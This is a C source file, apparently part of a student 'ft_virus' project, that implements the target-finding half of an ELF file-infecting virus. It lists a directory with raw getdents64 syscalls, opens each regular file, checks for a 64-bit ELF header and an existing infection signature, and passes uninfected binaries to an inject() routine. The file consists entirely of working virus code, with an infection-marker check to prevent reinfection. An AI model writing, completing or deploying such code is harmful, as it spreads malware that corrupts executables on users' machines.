#include "ft_virus.h"

# define BUF_SIZE 1024

int FORCE_INLINE signature_present(int fd)
{
	char signature[] = SIGNATURE;
	char buffer[sizeof(signature) - 1];
	char KO_MSG[] = "already infected\n";
	char OK_MSG[] = "not infected\n";

	LSEEK(fd, -1 * ((&payload_end + 5) - &payload_start - sizeof(signature) - 1), SEEK_END);
	READ(fd, &buffer, sizeof(signature) - 1);
	WRITE(1, buffer, sizeof(buffer));
	if (!ft_memcmp(buffer, signature, sizeof(signature) - 1))
	{
		WRITE(1, KO_MSG, sizeof(KO_MSG));
		return (1);
	}
	WRITE(1, OK_MSG, sizeof(OK_MSG));
	return (0);

}

int FORCE_INLINE is_good_format(char *filename)
{
	char	buf[BUF_SIZE];
	char	infested_dir[] = INFESTED_DIR;
	char	elfmag[] = ELFMAG;
	int	fd;
	Elf64_Ehdr header;
	size_t	name_size;


	name_size = ft_strlen(filename);
	if (name_size + sizeof(infested_dir) > BUF_SIZE)
		return (-1);
	ft_memcpy(buf, infested_dir, sizeof(infested_dir) - 1);
	ft_memcpy(buf + sizeof(infested_dir) - 1, filename, name_size);
	buf[name_size + sizeof(infested_dir) - 1] = 0;
	WRITE(1, buf, ft_strlen(buf));
	fd = OPEN(buf, O_RDWR);
	if (fd < 0)
		return (-1);
	READ(fd, &header, sizeof(header));
	WRITE(1, (char*)&header, sizeof(elfmag) - 1);
	if (ft_memcmp((char*)&header, elfmag, sizeof(elfmag) - 1)
		|| ((char*)&header)[EI_CLASS] != ELFCLASS64
		// || header.e_type != ET_EXEC
		|| signature_present(fd))
	{
		CLOSE(fd);
		return (-1);
	}
	// for 5 the size of the jump instruction
	// verify if not alread infected
	return (fd);
}

int finder(t_data data, int dir_fd)
{
	int	nread;
	int	bpos;
	struct linux_dirent64 *d;
	char	buf[BUF_SIZE];

	while(1)
	{
		nread = syscall3(SYS_GETDENT64, (u64)dir_fd, (u64)buf, (u64)BUF_SIZE);
		if (!nread || nread == -1)
		{
			return (0);
		}
		bpos = 0;
		while (bpos < nread)
		{
			d = (struct linux_dirent64*)(buf + bpos);
			if (d->d_type == DT_REG &&
					(data.fd = is_good_format(d->d_name)) != -1)
				inject(data);
			bpos += d->d_reclen;
		}
	}
	return (0);
}
